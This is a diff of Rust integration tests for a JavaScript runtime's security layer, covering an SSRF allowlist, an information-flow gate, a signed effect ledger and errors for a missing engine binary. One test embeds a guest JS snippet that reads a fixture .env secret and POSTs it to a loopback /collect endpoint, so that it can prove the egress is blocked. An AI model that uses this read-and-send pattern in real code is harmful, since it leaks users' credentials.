+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json).expect("verifier SDK accepts the ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-plhag-blocked");
+    let chain = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the effect chain offline");
+    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+        forbidden_label_set_commitments: vec![secret_commitment.clone()],
+        external_sink_effect_kinds: vec!["http_request".to_string()],
+        allowed_declassification_refs: vec![],
+    };
+    let non_exfil =
+        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
+            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
+    let http_proof = non_exfil
+        .examined_effects
+        .iter()
+        .find(|e| e.effect_kind == "http_request")
+        .expect("an examined http_request effect");
+    assert_eq!(
+        http_proof.proof_outcome, "blocked_before_sink",
+        "the SDK must classify the blocked secret egress as blocked_before_sink"
+    );
+}
+
+/// bd-n1bym (PREVENTION at an allowed sink): the same secret read, but the
+/// guest POSTs it to an operator-allowlisted loopback endpoint the SSRF gate
+/// PERMITS. The information-flow gate — wrapped OUTSIDE the SSRF gate — refuses
+/// the egress before any socket opens because its bytes carry the secret this
+/// run read. The leak never physically happens: the loopback listener receives
+/// no connection, the ledger records a DENIED flow-blocked egress, and the
+/// verifier SDK proves "blocked_before_sink". (Under bd-plhag alone this same
+/// scenario leaked and was only DETECTED after the fact; bd-n1bym converts the
+/// detection into prevention.)
+#[test]
+#[cfg(feature = "engine")]
+fn run_blocks_secret_egress_to_allowed_sink_bd_n1bym() {
+    use frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment;
+    use std::io::ErrorKind;
+    use std::net::TcpListener;
+
+    // A loopback sink at an allowlisted address. The flow gate denies pre-socket,
+    // so NOTHING should ever connect — the listener is non-blocking and we assert
+    // no connection arrived (the physical proof the secret never left).
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+    listener
+        .set_nonblocking(true)
+        .expect("non-blocking listener");
+    let addr = listener.local_addr().expect("listener addr");
+
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    std::fs::write(
+        temp_dir.path().join(".env"),
+        "SECRET_TOKEN=plhag-flow-e2e-do-not-exfiltrate-abcdef0123456789\n",
+    )
+    .expect("write .env fixture secret");
+    let source = format!(
+        "const fs = require('fs');\n\
+         const secret = fs.readFileSync('.env', 'utf8');\n\
+         const http = require('http');\n\
+         const req = http.request('http://{addr}/collect', {{ method: 'POST' }});\n\
+         req.end(secret);\n"
+    );
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "bd-n1bym e2e: SSRF allows loopback; the flow gate must still block"
+                .to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with a flow-blocked secret egress should still complete");
+
+    // Physical proof the secret never left: no connection reached the sink.
+    match listener.accept() {
+        Err(err) if err.kind() == ErrorKind::WouldBlock => {}
+        other => {
+            panic!("the flow gate must prevent the egress; the sink saw a connection: {other:?}")
+        }
+    }
+
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("host-effect ledger");
+    let secret_commitment = secret_file_label_set_commitment();
+    let egress = ledger
+        .entries
+        .iter()
+        .find(|e| e.receipt.effect_kind.label() == "http_request")
+        .expect("an http_request receipt for the egress");
+    assert!(
+        matches!(
+            egress.receipt.policy_outcome,
+            frankenengine_node::runtime::effect_receipt::PolicyOutcome::Denied { .. }
+        ),
+        "the flow gate must DENY the secret egress even though SSRF allows the endpoint"
+    );
+    assert_eq!(
+        egress.receipt.flow_policy_verdict.label(),
+        "blocked",
+        "the prevented secret egress is a flow block"
+    );
+    assert_eq!(egress.receipt.label_set_commitment, secret_commitment);
+    assert!(ledger.denied_count >= 1);
+
+    // The verifier SDK proves OFFLINE that the secret was blocked before the sink.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json).expect("verifier SDK accepts the ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-n1bym-prevent");
+    let chain = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the effect chain offline");
+    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
+        forbidden_label_set_commitments: vec![secret_commitment],
+        external_sink_effect_kinds: vec!["http_request".to_string()],
+        allowed_declassification_refs: vec![],
+    };
+    let non_exfil =
+        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
+            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
+    assert!(
+        non_exfil
+            .examined_effects
+            .iter()
+            .any(|e| e.effect_kind == "http_request" && e.proof_outcome == "blocked_before_sink"),
+        "the SDK must classify the flow-blocked secret egress as blocked_before_sink"
+    );
+}
+
+/// bd-3894s slice (2c) (http leg, mock-free e2e — response callback delivery): a
+/// real, idiomatic JS program that uses the Node response-callback form —
+/// `http.get(url, (res) => { ... })` — run through the PUBLIC `dispatch_run` path.
+/// The `http.get` egress fires synchronously and the response callback is delivered
+/// `cb(res)` on the next event-loop turn (the engine drains the macrotask queue
+/// after the program's synchronous portion). The callback EXECUTING with the REAL
+/// parsed response is proven mock-free: it gates on `res.status === 200` and writes
+/// `res.body` (the bytes the loopback server actually returned) to the sandbox —
+/// so the file only exists, with the server's body, if the callback ran and saw the
+/// genuine response. The signed host-effect ledger carries BOTH effects: the
+/// `http_request` egress (the program's main turn) AND the `fs_write` the callback
+/// performed (the event-loop turn), proving the callback's own effect is
+/// proof-carrying too. No mocks: real parser/lowering of `http.get(url, cb)`,
+/// real SSRF-gated egress + round trip, real callback execution, real fs write.
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_signed_http_get_response_callback_ledger_bd_3894s() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A loopback listener that accepts one connection, reads the half-closed request
+    // to EOF, then replies with a distinctive body and closes so the guest's
+    // response read terminates (the slice-4 single-socket round trip). The body the
+    // callback writes back to disk proves it received THIS response.
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
+        stream
+            .set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let mut received = Vec::new();
+        let _ = stream.read_to_end(&mut received);
+        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nserved-ok");
+        let _ = stream.flush();
+        received
+    });
+
+    // The guest program registers a response callback. It gates on the parsed
+    // status (`res.status === 200`) and writes the parsed body (`res.body`) to the
+    // sandbox — so the file is the load-bearing proof the callback both RAN and saw
+    // the real response. `http.get(url, cb)` lowers to `net:request` carrying the
+    // trailing closure; the engine delivers `cb(res)` on the next event-loop turn.
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let source = format!(
+        "const http = require('http');\n\
+         http.get('http://{addr}/', (res) => {{\n\
+         \x20 if (res.status === 200) {{\n\
+         \x20   require('fs').writeFileSync('cb_out.txt', res.body);\n\
+         \x20 }}\n\
+         }});\n"
+    );
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    // legacy-risky grants network_egress (the http.get egress) AND fs_write (the
+    // callback's writeFileSync); the operator allowlists the loopback sink so the
+    // product-layer SSRF gate authorizes this exact endpoint.
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "e2e: permit the loopback test sink".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with an http.get response callback should succeed");
+
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+
+    // The egress crossed the socket as a real GET.
+    let received = server.join().expect("server thread");
+    let wire = String::from_utf8_lossy(&received);
+    assert!(
+        wire.starts_with("GET / HTTP/1.1\r\n"),
+        "the loopback sink must observe the engine-framed GET request, got {wire:?}"
+    );
+
+    // THE LOAD-BEARING PROOF: the response callback executed on the event-loop turn
+    // with the REAL parsed response — it only writes when `res.status === 200`, and
+    // it writes `res.body`, so the file holds exactly the server's reply body.
+    assert_eq!(
+        std::fs::read(temp_dir.path().join("cb_out.txt"))
+            .expect("the response callback must have written cb_out.txt"),
+        b"served-ok",
+        "the callback ran with the real response: it gated on res.status === 200 and wrote res.body"
+    );
+
+    // The signed host-effect ledger carries BOTH the egress and the callback's own
+    // fs write — proof the response-callback path is proof-carrying end to end.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native http.get callback run must surface a host-effect ledger");
+    assert_eq!(
+        ledger.effect_count, 2,
+        "expected the http_request egress + the callback's fs_write, got {:?}",
+        ledger.entries
+    );
+    assert_eq!(ledger.allowed_count, 2);
+    assert_eq!(ledger.denied_count, 0);
+    let kinds: Vec<&str> = ledger
+        .entries
+        .iter()
+        .map(|entry| entry.receipt.effect_kind.label())
+        .collect();
+    assert_eq!(
+        kinds,
+        vec!["http_request", "fs_write"],
+        "the egress (main turn) precedes the callback's fs write (event-loop turn)"
+    );
+
+    // An external auditor re-derives the whole chain offline from the ledger entries.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-http-callback-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the http + fs effect chain offline");
+    assert_eq!(verdict.effect_count, 2);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-3894s slice (2d) (http leg, mock-free e2e — IncomingMessage readable-stream
+/// EVENT model): a real, idiomatic JS program that consumes the response through the
+/// Node readable-stream events — `res.on('data', chunk => …)` then `res.on('end',
+/// () => …)` — registered INSIDE the `http.get(url, (res) => { … })` response
+/// callback, run through the PUBLIC `dispatch_run` path. This is the proof the event
+/// model is real end to end:
+///   - `http.get(url, cb)` lowers to `net:request` carrying the trailing closure; the
+///     engine delivers `cb(res)` on the next event-loop turn (slice 2c);
+///   - inside that callback the program registers `res.on('data', …)` and
+///     `res.on('end', …)` on the `IncomingMessage` (slice 2d `.on` via the `__type`
+///     tag);
+///   - on the FOLLOWING turns the engine emits `'data'` with the whole body as one
+///     chunk (the listener accumulates it) and then `'end'` (the listener writes the
+///     accumulated buffer to the sandbox).
+///
+/// The file therefore exists, with the server's body, ONLY if the listeners were
+/// registered AND fired in data→end order with the real response bytes — no synchronous
+/// `res.body` shortcut is used. The signed host-effect ledger carries BOTH the
+/// `http_request` egress and the `fs_write` the `'end'` listener performed, and the
+/// verifier SDK re-derives the chain offline. No mocks: real parser/lowering, real
+/// SSRF-gated egress + round trip, real event-emitter dispatch, real fs write.
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_signed_http_get_response_event_stream_ledger_bd_3894s() {
+    use std::io::{Read, Write};
+    use std::net::TcpListener;
+
+    // A loopback listener that accepts one connection, reads the half-closed request
+    // to EOF, then replies with a distinctive body and closes so the guest's response
+    // read terminates (the slice-4 single-socket round trip). The body the 'end'
+    // listener writes back to disk proves the readable stream delivered THIS response.
+    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
+    let addr = listener.local_addr().expect("listener addr");
+    let server = std::thread::spawn(move || {
+        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
+        stream
+            .set_read_timeout(Some(Duration::from_secs(5)))
+            .expect("read timeout");
+        let mut received = Vec::new();
+        let _ = stream.read_to_end(&mut received);
+        let _ = stream.write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 9\r\n\r\nserved-ok");
+        let _ = stream.flush();
+        received
+    });
+
+    // The guest program registers readable-stream listeners on the response and only
+    // writes on 'end', from a buffer ACCUMULATED across 'data' events — so the file is
+    // load-bearing proof that 'data' delivered the real body chunk and 'end' fired
+    // after it, with the listeners registered inside the response callback.
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let source = format!(
+        "const http = require('http');\n\
+         http.get('http://{addr}/', (res) => {{\n\
+         \x20 let body = '';\n\
+         \x20 res.on('data', (chunk) => {{ body += chunk; }});\n\
+         \x20 res.on('end', () => {{\n\
+         \x20   require('fs').writeFileSync('cb_out.txt', body);\n\
+         \x20 }});\n\
+         }});\n"
+    );
+    let app_path = create_test_app(temp_dir.path(), "app.js", &source);
+
+    // legacy-risky grants network_egress (the http.get egress) AND fs_write (the
+    // 'end' listener's writeFileSync); the operator allowlists the loopback sink so
+    // the product-layer SSRF gate authorizes this exact endpoint.
+    let mut config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+    config
+        .security
+        .network_policy
+        .allowlist
+        .push(NetworkAllowlistEntry {
+            host: "127.0.0.1".to_string(),
+            port: None,
+            reason: "e2e: permit the loopback test sink".to_string(),
+        });
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("native run with http response stream events should succeed");
+
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+
+    // The egress crossed the socket as a real GET.
+    let received = server.join().expect("server thread");
+    let wire = String::from_utf8_lossy(&received);
+    assert!(
+        wire.starts_with("GET / HTTP/1.1\r\n"),
+        "the loopback sink must observe the engine-framed GET request, got {wire:?}"
+    );
+
+    // THE LOAD-BEARING PROOF: the 'end' listener wrote the buffer accumulated from the
+    // 'data' event(s), so the file holds exactly the server's reply body — which is
+    // only true if res.on('data') delivered the real chunk and res.on('end') fired
+    // after it, both registered inside the response callback.
+    assert_eq!(
+        std::fs::read(temp_dir.path().join("cb_out.txt"))
+            .expect("the 'end' listener must have written cb_out.txt"),
+        b"served-ok",
+        "data→end fired in order: 'data' delivered res body, 'end' wrote the accumulated buffer"
+    );
+
+    // The signed host-effect ledger carries BOTH the egress and the 'end' listener's
+    // own fs write — proof the readable-stream event path is proof-carrying end to end.
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native http stream-event run must surface a host-effect ledger");
+    assert_eq!(
+        ledger.effect_count, 2,
+        "expected the http_request egress + the 'end' listener's fs_write, got {:?}",
+        ledger.entries
+    );
+    assert_eq!(ledger.allowed_count, 2);
+    assert_eq!(ledger.denied_count, 0);
+    let kinds: Vec<&str> = ledger
+        .entries
+        .iter()
+        .map(|entry| entry.receipt.effect_kind.label())
+        .collect();
+    assert_eq!(
+        kinds,
+        vec!["http_request", "fs_write"],
+        "the egress (main turn) precedes the 'end' listener's fs write (later event-loop turn)"
+    );
+
+    // An external auditor re-derives the whole chain offline from the ledger entries.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk =
+        frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-3894s-http-event-stream-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the http + fs effect chain offline");
+    assert_eq!(verdict.effect_count, 2);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
+}
+
+/// bd-656a2 / bd-3894s (http leg, mock-free e2e — DENIED half): the fail-closed
+/// counterpart of the allowed e2e. A real `require('http').get('http://127.0.0.1:9/')`
+/// program — a loopback endpoint the default-deny SSRF policy blocks, with no
+/// config allowlist — run through the PUBLIC `dispatch_run` path is gated BEFORE
+/// the socket opens. The denial is surfaced as a signed DENIED `http_request`
+/// EffectReceipt in the run --json host-effect ledger (proof that nothing reached
+/// the network), the run still completes (the denial is not a fatal fault), and
+/// the verifier SDK re-derives the chain offline.
+///
+/// Together with the allowed-half test this is the close-out conjunction for the
+/// bd-656a2 http producer: the http.request L1 subject is proof-carrying on BOTH
+/// the authorized and the refused path.
+#[test]
+#[cfg(feature = "engine")]
+fn run_surfaces_denied_http_request_effect_ledger_bd_656a2() {
+    use frankenengine_node::runtime::effect_receipt::PolicyOutcome;
+
+    // A loopback endpoint the default-deny policy blocks. The SSRF gate denies it
+    // before any connection is attempted, so this never reaches the network (no
+    // listener is needed and none is bound — the test is hermetic).
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    let app_path = create_test_app(
+        temp_dir.path(),
+        "app.js",
+        "require('http').get('http://127.0.0.1:9/');\n",
+    );
+
+    // legacy-risky grants network_egress (so the egress hostcall is authorized at
+    // the engine layer), but the run uses the DEFAULT [security.network_policy]
+    // (Block, no allowlist) — so the product-layer SSRF gate denies loopback.
+    let config = Config {
+        profile: Profile::LegacyRisky,
+        ..Config::default()
+    };
+
+    let engine_dir = TempDir::new().expect("Failed to create engine dir");
+    let engine_path = create_fixture_engine_binary(engine_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(engine_path), PreferredRuntime::FrankenEngine);
+    // The denied egress must NOT abort the run: dispatch_run still succeeds and
+    // surfaces the ledger with a fail-closed denied receipt.
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "legacy-risky", &[], 0)
+        .expect("a policy-denied http egress must not fail the run");
+
+    assert_eq!(report.runtime, "franken_engine");
+
+    let ledger = report
+        .host_effect_ledger
+        .as_ref()
+        .expect("native http run must surface a host-effect ledger even on denial");
+    assert_eq!(
+        ledger.effect_count, 1,
+        "the blocked egress must still produce one (denied) effect, got {:?}",
+        ledger.entries
+    );
+    assert_eq!(
+        ledger.denied_count, 1,
+        "the egress must be recorded as denied"
+    );
+    assert_eq!(
+        ledger.allowed_count, 0,
+        "nothing was authorized to reach the network"
+    );
+
+    let receipt = &ledger.entries[0].receipt;
+    assert_eq!(
+        receipt.effect_kind.label(),
+        "http_request",
+        "the blocked egress is still an http_request subject"
+    );
+    assert!(
+        matches!(receipt.policy_outcome, PolicyOutcome::Denied { .. }),
+        "the receipt must carry a fail-closed Denied outcome, got {:?}",
+        receipt.policy_outcome
+    );
+    // Fail-closed proof: a denied effect has no produced/post state.
+    assert!(
+        receipt.result_hash.is_none() && receipt.post_state_hash.is_none(),
+        "a denied effect must carry no result/post-state (nothing ran)"
+    );
+
+    // run --json surfaces the denied receipt.
+    let json = serde_json::to_string(&report).expect("serialize run report as run --json");
+    assert!(
+        json.contains("\"host_effect_ledger\"") && json.contains("\"denied\""),
+        "run --json must include the denied host-effect ledger entry"
+    );
+
+    // The verifier SDK re-derives the chain offline — denied receipts are part of
+    // the same tamper-evident chain.
+    let entries_json = serde_json::to_string(&ledger.entries).expect("serialize ledger entries");
+    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
+        serde_json::from_str(&entries_json)
+            .expect("verifier SDK accepts the run --json ledger wire shape");
+    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://bd-656a2-http-denied-e2e");
+    let verdict = sdk
+        .verify_effect_chain_entries(&sdk_entries)
+        .expect("verifier SDK re-derives the denied http effect chain offline");
+    assert_eq!(verdict.effect_count, 1);
+    assert_eq!(verdict.head_chain_hash, ledger.chain_head_hash);
 }
 
 #[test]
@@ -312,7 +1558,15 @@ fn test_native_engine_error_handling_propagation() {
 
     let config = balanced_config();
 
-    let dispatcher = EngineDispatcher::new(None, PreferredRuntime::FrankenEngine);
+    // bd-rpo4f: pin an explicit fixture engine placeholder so dispatch
+    // resolution succeeds deterministically on every host (previously
+    // `None` depended on host PATH/candidate state, and on engine-less
+    // machines resolution failed first, masking the source-read error this
+    // test asserts — historically via an in-library exit(127) that killed
+    // the whole suite). The --engine-bin hint takes precedence over env,
+    // config, and candidates, so host state cannot leak in.
+    let fixture_engine = create_fixture_engine_binary(temp_dir.path());
+    let dispatcher = EngineDispatcher::new(Some(fixture_engine), PreferredRuntime::FrankenEngine);
     // Create test telemetry bridge
     let socket_path = temp_dir.path().join("test-telemetry.sock");
     let adapter = Arc::new(Mutex::new(FrankensqliteAdapter::default()));
@@ -354,7 +1608,15 @@ fn test_native_engine_error_handling_propagation() {
     }
 }
 
+/// bd-rpo4f follow-through, same disease as the bd-4f4f0 exit-code sibling
+/// below: the external-process dispatch path for the FrankenEngine plan only
+/// exists WITHOUT the `engine` feature — with it, execution is native and
+/// in-process, the slow fixture binary is never spawned, and a fast
+/// `console.log` app completes instantly, so `result.is_err()` can never
+/// hold. This failure was invisible until bd-rpo4f removed the in-library
+/// exit(127) that aborted the suite before this test reported.
 #[test]
+#[cfg(not(feature = "engine"))]
 fn test_engine_timeout_handling_with_fixture_binary() {
     // Set a short timeout for testing (5 seconds instead of default 5 minutes)
     unsafe {
@@ -451,156 +1713,192 @@ fn test_engine_timeout_handling_with_fixture_binary() {
     );
 }
 
+/// bd-rpo4f: an unavailable requested runtime must surface as a typed,
+/// downcastable `Err` from `dispatch_run` — never a `std::process::exit`
+/// from library code. Before the fix this exact in-process call terminated
+/// the whole test binary with exit 127 mid-suite ("test exited abnormally"),
+/// silently skipping every test after it on hosts without a resolvable
+/// engine binary. The downcast assertion pins the seam main.rs uses to map
+/// this error to the CLI-level exit 127.
 #[test]
-#[cfg(feature = "engine")]
-fn test_native_engine_missing_binary_error_handling() {
-    // Test boundary condition: engine feature enabled but binary missing
+fn test_requested_runtime_unavailable_returns_typed_error_in_process() {
     let temp_dir = TempDir::new().expect("Failed to create temp dir");
     let app_path = create_test_app(
+        temp_dir.path(),
+        "unavailable_runtime.js",
+        r#"console.log("never runs: requested engine is missing");"#,
+    );
+    // An explicit --engine-bin hint takes precedence over env, config, and
+    // candidates, so pointing at a nonexistent path fails resolution
+    // deterministically regardless of host state.
+    let missing_engine = temp_dir.path().join("missing-franken-engine");
+    let config = balanced_config();
+    let dispatcher = EngineDispatcher::new(Some(missing_engine), PreferredRuntime::FrankenEngine);
+
+    let result = dispatcher.dispatch_run(&app_path, &config, &config.profile.to_string(), &[], 0);
+
+    let err = result.expect_err("missing requested engine must be an Err, not a process exit");
+    let message = err.to_string();
+    assert!(
+        message.contains("franken-engine") && message.contains("not found"),
+        "unavailable-runtime error must stay actionable, got: {message}"
+    );
+    assert!(
+        matches!(
+            err.downcast_ref::<DispatchResolutionError>(),
+            Some(DispatchResolutionError::RequestedRuntimeUnavailable(_))
+        ),
+        "CLI boundary must be able to downcast the typed unavailable error"
+    );
+}
+
+/// bd-4f4f0: requesting `--runtime franken-engine` with a missing engine
+/// binary is a fail-closed CLI contract — the process exits 127 with an
+/// actionable message. Asserted through the REAL binary in a subprocess
+/// because the 127 mapping lives at the CLI boundary in main.rs
+/// (bd-rpo4f moved it there; `dispatch_run` itself now returns the typed
+/// `DispatchResolutionError::RequestedRuntimeUnavailable` instead of
+/// terminating the process). (The old in-process variant passed the
+/// invalid policy mode "test" and, since bd-233ja's fail-closed policy-mode
+/// validation, asserted on the wrong error entirely.)
+#[test]
+fn test_native_engine_missing_binary_error_handling() {
+    let temp_dir = TempDir::new().expect("Failed to create temp dir");
+    create_test_app(
         temp_dir.path(),
         "missing_binary_test.js",
         r#"console.log("This should fail - engine binary missing");"#,
     );
 
-    // Point to a non-existent engine binary
-    let nonexistent_engine_path = temp_dir.path().join("nonexistent-franken-engine");
-
-    let config = balanced_config();
-
-    let dispatcher = EngineDispatcher::new(
-        Some(nonexistent_engine_path.clone()),
-        PreferredRuntime::FrankenEngine,
-    );
-
-    // Execute and expect failure due to missing binary
-    let result = dispatcher.dispatch_run(&app_path, &config, "test", &[], 0);
-
-    assert!(result.is_err(), "Should fail when engine binary is missing");
-
-    let error = result.unwrap_err();
-    let error_str = error.to_string();
-
-    // Verify this is an ActionableError with proper context
+    // Bootstrap a fail-closed-valid workspace exactly as a real operator
+    // would (`init` synthesizes trust.registry_signing_key and the other
+    // required security defaults so `run` reaches dispatch resolution).
+    let init = assert_cmd::Command::cargo_bin("franken-node")
+        .expect("franken-node binary")
+        .current_dir(temp_dir.path())
+        .args(["init", "--profile", "balanced", "--out-dir", "."])
+        .output()
+        .expect("init command should execute");
     assert!(
-        error_str.contains("engine")
-            || error_str.contains("binary")
-            || error_str.contains("not found")
-            || error_str.contains("No such file"),
-        "Error should indicate engine binary issue, got: {}",
-        error_str
+        init.status.success(),
+        "init must bootstrap the workspace: stderr={}",
+        String::from_utf8_lossy(&init.stderr)
     );
 
-    // Verify error provides meaningful context (ActionableError integration tested elsewhere)
-    println!("Engine binary missing error: {}", error_str);
+    // The CLI rejects absolute user-content paths, so run from the app's
+    // directory with relative paths (matching the run-CLI e2e conventions).
+    // The --engine-bin hint takes absolute precedence in resolution and is
+    // used verbatim, so the missing relative path deterministically fails
+    // the existence check regardless of host PATH/candidate state.
+    let output = assert_cmd::Command::cargo_bin("franken-node")
+        .expect("franken-node binary")
+        .current_dir(temp_dir.path())
+        .args([
+            "run",
+            "missing_binary_test.js",
+            "--policy",
+            "balanced",
+            "--runtime",
+            "franken-engine",
+            "--engine-bin",
+            "nonexistent-franken-engine",
+        ])
+        .output()
+        .expect("run command should execute");
+
+    assert_eq!(
+        output.status.code(),
+        Some(127),
+        "a missing requested engine binary must exit 127: stdout={} stderr={}",
+        String::from_utf8_lossy(&output.stdout),
+        String::from_utf8_lossy(&output.stderr)
+    );
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(
+        stderr.contains("franken-engine") && stderr.contains("not found"),
+        "the refusal must name the missing runtime actionably, got: {stderr}"
+    );
 }
 
+/// bd-4f4f0: the external-process dispatch path for the FrankenEngine plan
+/// only exists WITHOUT the `engine` feature — with it, execution is native
+/// and in-process, fixture binaries are never spawned, and the old
+/// always-compiled variant of this test passed vacuously (it asserted loose
+/// wording against an unrelated error). Under `not(engine)`, a fixture
+/// engine exiting non-zero is NOT a dispatch error: the run completes and
+/// the report surfaces the real exit code fail-visibly.
 #[test]
+#[cfg(not(feature = "engine"))]
 fn test_engine_non_zero_exit_code_fixture_error_handling() {
-    // Test boundary condition: controlled fixture engine returns non-zero exit.
     let temp_dir = TempDir::new().expect("Failed to create temp dir");
     let app_path = create_test_app(
         temp_dir.path(),
         "exit_code_test.js",
-        r#"console.log("This should fail due to engine exit code");"#,
+        r#"console.log("This should surface the engine exit code");"#,
     );
 
     // Create a fixture engine that returns exit code 1
     let failing_engine_path = create_failing_fixture_engine_binary(temp_dir.path(), 1);
 
     let config = balanced_config();
-
-    // Force external process execution to test exit code handling
     let dispatcher = EngineDispatcher::new(
         Some(failing_engine_path.clone()),
         PreferredRuntime::FrankenEngine,
     );
 
-    // Execute and expect failure due to non-zero exit
-    let result = dispatcher.dispatch_run(&app_path, &config, "test", &[], 0);
+    let report = dispatcher
+        .dispatch_run(&app_path, &config, "balanced", &[], 0)
+        .expect("subprocess dispatch surfaces exit codes in the report, not as errors");
 
-    assert!(
-        result.is_err(),
-        "Should fail when engine returns non-zero exit code"
+    assert_eq!(report.runtime, "franken_engine");
+    assert!(!report.used_fallback_runtime);
+    assert_eq!(
+        report.exit_code,
+        Some(1),
+        "the report must carry the fixture engine's real exit code"
     );
-
-    let error = result.unwrap_err();
-    let error_str = error.to_string();
-
-    // Verify error indicates process failure
     assert!(
-        error_str.contains("failed")
-            || error_str.contains("exit")
-            || error_str.contains("error")
-            || error_str.contains("status"),
-        "Error should indicate process failure, got: {}",
-        error_str
+        !report.terminated_by_signal,
+        "a clean non-zero exit is not a signal termination"
     );
-
-    // Verify error provides meaningful context (ActionableError integration tested elsewhere)
-    println!("Engine exit code error: {}", error_str);
 }
 
+/// bd-4f4f0 (see the exit-code variant above for the routing reality): a
+/// fixture engine killed by a signal completes the dispatch with no exit
+/// code and `terminated_by_signal` set — the abnormal termination is
+/// fail-visible in the report rather than smuggled into an error string.
 #[test]
+#[cfg(not(feature = "engine"))]
 fn test_engine_crash_signal_fixture_error_handling() {
-    // Test boundary condition: controlled fixture engine terminates abnormally.
     let temp_dir = TempDir::new().expect("Failed to create temp dir");
     let app_path = create_test_app(
         temp_dir.path(),
         "crash_test.js",
-        r#"console.log("This should fail due to engine crash");"#,
+        r#"console.log("This should surface the engine crash");"#,
     );
 
     // Create a fixture engine that crashes with SIGKILL
     let crashing_engine_path = create_crashing_fixture_engine_binary(temp_dir.path());
 
     let config = balanced_config();
-
-    // Force external process execution to test signal handling
     let dispatcher = EngineDispatcher::new(
         Some(crashing_engine_path.clone()),
